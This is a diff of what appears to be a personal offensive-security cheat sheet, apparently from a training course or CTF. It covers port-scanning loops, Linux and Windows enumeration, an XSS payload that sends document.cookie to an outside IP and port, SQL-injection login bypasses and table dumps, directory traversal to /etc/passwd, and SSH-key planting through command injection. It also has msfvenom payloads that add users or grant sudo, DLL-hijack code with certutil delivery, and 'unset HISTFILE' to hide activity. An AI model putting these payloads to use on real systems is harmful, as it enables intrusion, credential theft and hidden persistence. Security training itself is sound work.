@@ -1,67 +1,69 @@
-/////////////////// Linux Enumeration \\\\\\\\\\\\\\
-
-find / -type f -perm /4000 2>/dev/null --> find suid / guid
-find /dev -type f --> find writeable files in /dev
-find / -type d -writable --> find writeable dirs
-
-echo “a bunch of text” | tr ‘ ‘ ‘\n’ --> translate spaces to endlines for /etc/passwd
-
----------------------------
-check encoding on creds
-rot13
-base64
---------------------------
-
-Check CRONTAB
-
-find /etc/cron* -writable 
-find /etc/cron* --> look for something weird
-cat /etc/crontab --> look for something weird
-cd /etc/cron.d --> look for something weird
-
-
 ///////////////////// Scans \\\\\\\\\\\\\\\\\
 
-nmap <IP> --script smb-os-discovery
-nmap <IP> -sT -Pn -p 80 --script http-enum
+nmap <IP> --script smb-os-discovery		#enumerate smb
+nmap <IP> -sT -Pn -p 80 --script http-enum	#enumerate website
 nmap <IP> --script smb-os-discover -p 445
 nmap --script banner <IP> -p port
 
-proxychains nikto -host <IP>
+proxychains nikto -host <IP>			#same as http-enum
+-or-
+nikto --host=http://10.50.20.170
 
-getend services <port> --> resolve a ports service through nsswitch.conf
+getend services <port>				#resolve a ports service through nsswitch.conf
 
-ken scan -----------------
+#Scan script for IPs
+for i in {1..254}; do nc -nzvw1 192.168.1.$i 20-23 80 2>&1 & done | grep -E 'succ|open$|OK$'
 
-for i in {20..22000}; do nc -nzvw1 <IP> $i 2>&1 & done | grep -E 'succ|open$'
+#Scan script for ports
+for i in {20..22000} ; do nc -nvzw1 <IP> $i 2>&1 & done | grep -E 'OK$|succ|open$'
 
---------------------------
+#scan with /dev/tcp
+for i in {20.22000} ; do if >/dev/tcp/<IP>/$i ; then echo Port $i & fi done
 
+ss -or- netstat (-tulpn)	#view listen connections
+ps aux | grep ssh		#view my backgrounded tunnels
 
-scan script --------------
+/////////////////// Linux Enumeration \\\\\\\\\\\\\\\\
 
-#!/bin/bash
+find / -type f -perm /4000 2>/dev/null		#find suid / guid
+find /dev -type f				#find writeable files in /dev
+find / -type d -writable			#find writeable dirs
+find /etc/cron* -writable			#look for something weird (also try without -writeable)
+find / -type f -exec file {} \; | grep PE	#looking for windows exe on linux
 
-for i in {1..254}
-do
-	nc -nzvw1 192.168.1.$i 1-65535 2>&1 &
-done | grep -E 'succ|open$'
+echo “a bunch of text” | tr ‘ ‘ ‘\n’		#translate spaces to endlines for /etc/passwd
 
 ---------------------------
+#check encoding on creds
+	rot13
+	base64
 
+#Check CRONTAB
+--------------------------
 
+cat /etc/crontab				#look for something weird
+cd /etc/cron.d					#look for something weird
+uname -a 
+cat /etc/os-release
+cd /etc/rsyslog.d				#cat .conf to see where/what is being logged
+ip neighbor
+whoami -or- groups
+ip a -or- route -or- ip route -or- ip addr
+unset HISTFILE
+set | grep HIST
+file *						#command to see what file is the windows exe
 
 ///////////////////// Web Site scraping \\\\\\\\\\\\\\\\\
 
+(in the url) /robots.txt	#tells you what my be there
+
 wget -r <IP of website> 
 
-grep -Er '[0-9a-zA-Z]{20}' | grep -vE 'fonts|{*}|js|Binary|css'
-
-
+grep -Er '[0-9a-zA-Z]{20}' | grep -vE 'fonts|{*}|js|Binary|css'		#for CTFD only
 
 ///////////////////// XSS \\\\\\\\\\\\\\\\\\\\\\\\
 
-1. post to the blog / check from another browser that the post saved on the server
+1. post to the blog && check from another browser that the post saved on the server
 
 2. test for XSS ( all text blocks )
 	
@@ -94,12 +96,9 @@ fclose($steal);
 
 <script> document.location="http://10.50.24.132:8001? username="+document.cookie;</script>
 
-
-
-
 ////////////////////// SQL Injection \\\\\\\\\\\\\\\\\\\\
 
-Log into SQL DB
+#Log into SQL DB
 ----------------
 shell> mysql --user=webuser --password=sqlpass
 
@@ -117,7 +116,6 @@ use <database>;
 @@version
 
 ---------------
-
 practice test
 
 url/pick.php?product=7 or 1=1 --> injectable
@@ -127,9 +125,7 @@ url/pick.php? union select 1,2,3
 url/pick.php?product=7 union select table_schema, table_name, column_name from information_schema.columns	
 
 url/select username,user_id,name from siteusers.users
-
 ---------------
-
 
 1. test for vulnerability / injection
 
@@ -164,61 +160,49 @@ ur/login.php?username=bob’ OR 1=’1 & password =bob’ OR 1=’1
 
 2. do the rest of the above steps
 
-
 ----------------------------------
 LOGIN PAGE
 
--ALWAYS try to dump username/password database like this --> login.php?username=bob' or 1='1 & passwd=bob'or 1='1 !!!!!!
+###ALWAYS try to dump username/password database like this
+login.php?username=bob' or 1='1 & passwd=bob'or 1='1 !!!!!!
 
-
-try injecting into the user input boxes 
-
-AND
-
-inject into the url --> 
+#try injecting into the user input boxes && into the url 
 	
 	login.php?username=tom' or 1='1 and passwd=tom' or 1='1
 
 	login.php?username=tom' or 1='1 & passwd=tom' or 1='1
 
-view page source --> to see what the names of the variables are (password or passwd)
- 
+#view page source to see what the names of the variables are (password or passwd)
 
-
-////////////////////// Command Injection \\\\\\\\\\\\\\\\
+///////////// Command Injection \\\\\\\\\\\\\\\\
 
 ; && || --> separate commands 
 
+////////// Malicious File Upload \\\\\\\\\\\\\\
 
-
+1. upload pony.php to site
+2. nav via url to where the file is saved on the site (i.e /uploads/)
 
 ///////////////////// Plant SSH Keys \\\\\\\\\\\\\\\\\\\\
 
-1. ssh-keygen --> make id_rsa.pub
+1. ssh-keygen			#make id_rsa.pub on OPs box
 
-2. using command injection--> make .ssh director and authorized keys file
-on target box
+2. using command injection	#make .ssh director and authorized keys file (on target box)
 
 3. echo ' < id_rsa.pub > ' > ~/.ssh/id_rsa.pub 
 
 4. ssh to that box
 
-
-
-
 ////////////////////// Directory Traversal \\\\\\\\\\\\\\\
 
 url/image.php?file=../../etc/passwd
 
-
 ../../../../../../../../../../../../../../../../../etc/passwd
 
-		/etc/group
-		/etc/hosts
-		/etc/resolv.conf
-		/etc/nsswitch.conf
-
-
+	/etc/group
+	/etc/hosts
+	/etc/resolv.conf
+	/etc/nsswitch.conf
 
 ////////////////////////////   Reverse Engineering   \\\\\\\\\\\\\\\\\\\\\\\\
 
@@ -227,33 +211,43 @@ Static analysis
 --use sha1sum to compare
 --diff to compare
 
+/////////////Buffer Overflow (Custom Payloads)\\\\\\\\\\\\\
+
+#show payloads
+msfvenom -l payloads | grep x86 | grep linux
+
+#show options of exploit
+msfvenom -p  linux/x86/adduser --list-options
+
+----------------------------------------------
+#create the custom payload creating a new user
+msfvenom -p  linux/x86/adduser SHELL=/bin/bash -f bash
+-or-
+msfvenom -p  linux/x86/adduser SHELL=/bin/bash -f bash -b'\x00\x0a\x0d\x20'	#take out bad chars
+
+copy and paste output into build-exploit-linux-traditional.sh
+
+-----------------------------------------------
+#create custom payload using the exec payload
+msfvenom -p linux/x86/exec CMD='usermod -aG sudo user3' -f bash -b '\x00\x0a\x0d\x20'
 
 
-
-///////////////////////////	Windows Escalation	\\\\\\\\\\\\\\\\\\\\\\\   
-
+////////////////////////// Windows Escalation \\\\\\\\\\\\\\\\\\\\\\\   
 
 check for vulnserver --> port 9999
 
-
-  
-
--- find the tasks / services being run 
+#find the tasks / services being run 
 schtasks /query /fo LIST /v | select-string -pattern "Task to Run" -Context 0,6 |  more
-
-or 
-
+-or- 
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
 
---enumerate permissions on directories / executables
+#enumerate permissions on directories / executables
+icacls <filename or directory>
 
-icacls <filename or directory
-
---search for dlls in the source code 
-
+#search for dlls in the source code 
 findstr dll <source code>
 
---create dll
+#create dll
 
 #include <windows.h>
 int execCommand()
@@ -267,21 +261,20 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
  return 0;
 }
 
---compile dll --> change example / source to dll name
+#compile dll (change example && source to dll name)
 
 i686-w64-mingw32-g++ -c -D example.dll source.c && i686-w64-mingw32-g++ -shared -o example.dll source.o -Wl,--out-implib,example.a
 
---download on target
+#download on target
 use simple http server 
-
-OR
-
+-or-
 base64 file | xclip -selection clipboard
 
 certutil -decode file.txt file.exe
 
---reboot machine
+#reboot machine
 shutdown -r
 
 REGISTRY KEY for usernames/passwords
 hklm/software/microsoft/windows nt/currentversion/winlogon
+
